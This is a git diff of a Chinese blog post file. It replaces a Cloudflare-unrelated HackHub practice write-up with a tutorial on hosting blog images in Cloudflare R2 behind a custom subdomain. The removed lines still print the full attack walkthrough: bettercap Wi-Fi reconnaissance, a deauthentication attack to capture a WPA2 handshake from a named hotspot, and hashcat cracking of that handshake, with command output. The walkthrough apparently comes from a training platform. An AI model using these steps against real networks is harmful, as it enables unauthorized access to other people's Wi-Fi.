@@ -1,105 +1,63 @@
 ---
-title: HackHub 實戰紀錄
-date: 2026-06-06
+title: "為您的部落格綁定 Cloudflare R2 雲端圖片庫與專屬自訂網域"
+date: 2026-06-07
 tags:
-  - "Wi-Fi"
-  - "bettercap"
-  - "hashcat"
-  - "滲透測試"
-  - "資訊安全"
-categories:
-  - "HackHub"
+  - "Cloudflare"
+  - "R2"
   - "教學"
+  - "CDN"
+categories:
+  - "網站架設"
 ---
+# 為什麼要使用 Cloudflare R2？
 
-以下為搭配實際操作指令與終端機輸出畫面，詳細梳理的網路安全測試與密碼破解流程。這是一次使用 HackHub 平台學習的實戰紀實。
+在這篇教學中，我們將學習如何將網站的靜態圖片搬到 Cloudflare R2 雲端空間，並且為它綁定您自己專屬的網域！比起 Amazon S3 或 Backblaze B2，Cloudflare R2 最大的優勢在於：**免除所有流量傳輸費 (Egress Fee)**，這對於一個擁有大量圖片的部落格來說，可以省下非常可觀的成本。
 
-## 1. 安裝網路分析工具與初始化環境
+### 為什麼不直接把圖片存在 GitHub 就好？
 
-首先安裝 `bettercap`，進入該工具後，開啟本機網路探測功能，並檢查目前的網路介面狀態，確認 `wlan0` 網卡有支援監聽模式（Monitoring: true）。
+很多人剛開始架設靜態網站時，會習慣把圖片直接丟進專案資料夾，跟著程式碼一起推送到 GitHub，然後交給 Vercel 或 Netlify 託管。雖然這很方便，但當您的網站成長時，會遇到兩個致命問題：
 
-**操作指令與輸出內容：**
+1. **Git 倉庫肥大化與效能災難**：Git 的設計初衷是用來追蹤純文字程式碼，並不擅長處理圖片等二進位大檔案。隨著文章變多，您的專案很快就會膨脹到好幾 GB，未來不僅本地打包速度變慢，Vercel 每次 Build 的時間也會被大幅拉長。
+2. **流量與頻寬限制（隱藏的帳單殺手）**：Vercel 的免費方案對頻寬與 Image Optimization (圖片最佳化) 都有嚴格的額度限制。如果您的網站流量變大，或是遭到惡意抓取，很快就會觸發高昂的超額收費。
 
-```text
-$ apt-get install bettercap
-Reading package lists... Done
-Building dependency tree
-Reading state information... Done
-Installing package...
-[##############################] %100.00
-The following NEW packages will be installed: bettercap
+相反地，將圖片抽離出來交給 **Cloudflare R2** 託管，不僅能保持 GitHub 倉庫永遠輕巧（只有幾 MB 大小），還能享受全世界最大 CDN 的光速載入優勢，最重要的是——**免收任何流出流量費**！這是一張部落格經營者的終極免死金牌。
 
-$ bettercap
-BetterCap > 127.0.0.1 » net.probe on
-[12:36:33] [sys.log] net.probe probing on 127.0.0.1/24
+## 步驟一：建立 R2 Bucket
 
-BetterCap > 127.0.0.1 » net.show
-+-----------+-----------+---------------------------------------------+------------+
-| Interface | Chipset   | Driver                                      | Monitoring |
-+-----------+-----------+---------------------------------------------+------------+
-| wlan0     | ath9k_htc | Atheros Communications, Inc. AR9271 802.11n | true       |
-| wlan1     | vap9      | madwifi-ng VAP                              | false      |
-+-----------+-----------+---------------------------------------------+------------+
+1. 首先登入您的 Cloudflare 後台。
+2. 在左側選單找到 **R2 Object Storage**。
+3. 點擊右上角的 **Create bucket**。
+4. 輸入您的 Bucket 名稱 (例如 `my-blog-images`)，並點擊 Create。
+
+## 步驟二：取得 R2 API 金鑰
+
+為了讓自動發文腳本能夠把圖片傳到 R2，我們需要取得 API 金鑰：
+1. 回到 R2 首頁，點擊右上角的 **Manage R2 API Tokens**。
+2. 點擊 **Create API token**。
+3. 權限設定請選擇 **Object Read & Write**，以便我們能上傳圖片。
+4. 點擊 Create API Token 後，請妥善複製並保存您的 `Access Key ID` 與 `Secret Access Key`，因為它們只會顯示一次！
+
+## 步驟三：設定本地端的環境變數
+
+在您的專案根目錄找到 `.env` 檔案，並填入剛剛拿到的金鑰與設定：
+
+```bash
+R2_ACCOUNT_ID=您的_Cloudflare_帳號_ID
+R2_ACCESS_KEY_ID=您的_Access_Key
+R2_SECRET_ACCESS_KEY=您的_Secret_Key
+R2_BUCKET_NAME=您的_Bucket_名稱
+R2_PUBLIC_DOMAIN=https://pub-xxxxx.r2.dev # (此為開發測試網址，下一步會教您替換)
 ```
 
-## 2. 掃描無線網路與鎖定目標
+## 步驟四：為 R2 綁定專屬自訂網域 (強烈建議！)
 
-接著，指定使用 `wlan0` 網卡啟動 Wi-Fi 偵測模組，列出周遭環境的無線存取點（AP）。在確認列表後，將目標鎖定為 SSID 為 `Maynard_Hotspot` 的設備。
+> ⚠️ Cloudflare R2 預設提供的 `.r2.dev` 網址具有存取次數限制，且網址過長、缺乏品牌識別度，不利於 SEO。強烈建議一定要綁定自訂的子網域！
 
-**操作指令與輸出內容：**
+1. 點進您的 R2 Bucket，點選上方的 **Settings (設定)**。
+2. 往下捲動找到 **Public Access (公開存取)** 區塊。
+3. 點擊 **Connect Domain (連接網域)**。
+4. 輸入您想要綁定的子網域（例如：`img.yourdomain.com` 或 `assets.yourdomain.com`）。
+   > **注意：** 請勿綁定您的主網域 (`yourdomain.com`)，這會導致您的主網站無法正常連線！
+5. 點擊繼續，Cloudflare 就會自動在您的 DNS 紀錄中加上這筆 CNAME 設定。
 
-```text
-BetterCap > 127.0.0.1 » wifi.recon wlan0
-[12:43:18] [sys.log] wifi.recon is currently running on wlan0 chipset.
-
-BetterCap > 127.0.0.1 » wifi.show
-(顯示包含 Maynard_Hotspot 在內的多個 AP 資訊，此處省略部分列表)
-| -30 dBm | a3:0b:49:3e:85:ee | Maynard_Hotspot  | WPA2 (CCMP, PSK) | 0   | 94e806a |
-
-BetterCap > 127.0.0.1 » set wifi.ap a3:0b:49:3e:85:ee
-[12:44:15] [sys.log] Target AP set to a3:0b:49:3e:85:ee (SSID: Maynard_Hotspot)
-```
-
-## 3. 發動解除認證攻擊並擷取交握封包
-
-鎖定目標後，發動解除認證攻擊（Deauthentication Attack），這會切斷目標設備上現有客戶端的連線。當客戶端嘗試重新連線時，系統成功擷取到了 WPA 交握封包（Handshake）並儲存下來。
-
-**操作指令與輸出內容：**
-
-```text
-BetterCap > 127.0.0.1 » wifi.deauth
-[12:44:35] [sys.log] Processing...
-[12:44:37] [sys.log] Sending deauthentication packets to a3:0b:49:3e:85:ee ...
-(重複發送封包...)
-[12:44:45] [sys.log] Process completed, capturing handshake ...
-[12:44:46] [sys.log] Handshake captured: /root/maynard_hotspot.pcap
-
-BetterCap > 127.0.0.1 » exit
-```
-
-## 4. 安裝破解工具與進行離線密碼破解
-
-退出 bettercap 後，安裝了密碼破解工具 `hashcat`。在確認擷取到的封包檔（`maynard_hotspot.pcap`）存在於當前目錄後，直接使用 hashcat 對該檔案進行破解，並成功得出了 Wi-Fi 密碼。
-
-**操作指令與輸出內容：**
-
-```text
-$ apt-get install hashcat
-(安裝過程省略)
-
-$ ls
-etc	lib	logs
-home	maynard_hotspot.pcap
-
-$ hashcat maynard_hotspot.pcap
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
-Guess.Queue......: 1/1 (100.00%)
-Time.Started.....: 2026/6/6 下午12:46:29
-Time.Estimated...: 2026/6/6 下午12:51:29
-Speed.#1.........: 102.3 kH/s (5.21ms) @ Accel:64 Loops:32 Thr:256 Vec:1
-
-Recovered.......: 1/1 (100.00%) Digests
-Password.......: "fovpBn0D7usDKl2"
-```
+等待狀態變成 **Active** 後，您就可以將 `.env` 裡的 `R2_PUBLIC_DOMAIN` 更新為 `https://img.yourdomain.com` 囉！
